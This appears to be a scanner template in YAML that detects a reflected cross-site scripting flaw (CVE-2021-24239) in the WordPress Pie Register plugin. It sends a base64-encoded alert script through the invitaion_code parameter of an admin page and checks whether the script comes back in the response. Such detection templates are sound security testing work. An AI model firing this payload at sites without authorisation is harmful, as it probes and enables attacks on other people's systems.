name: yaml-poc-genetechsolutions-pie_register-xss-CVE-2021-24239
binding: 9b980ec1-5dd1-455c-bb2e-5bea2834594e
detail:
    author: jiapeng.han
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-24239
        - https://plugins.trac.wordpress.org/changeset/2507536/
        - https://wpscan.com/vulnerability/f1b67f40-642f-451e-a67a-b7487918ee34
    vulnerability:
        id: 9b33e323-2fa0-42e0-a764-65a9b5e6db0d
        level: medium
    warning: Harmless
transport: http
set:
    rand: randomInt(100000, 200000)
    payload: base64("<script>alert(" + string(rand) + ");</script>")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin.php?page=pr_new_registration_form&show_dash_widget=1&invitaion_code={{payload}}
        expression: response.status == 200 && response.body.bcontains(bytes("<script>alert(" + string(rand) + ");</script>"))
expression: r0()
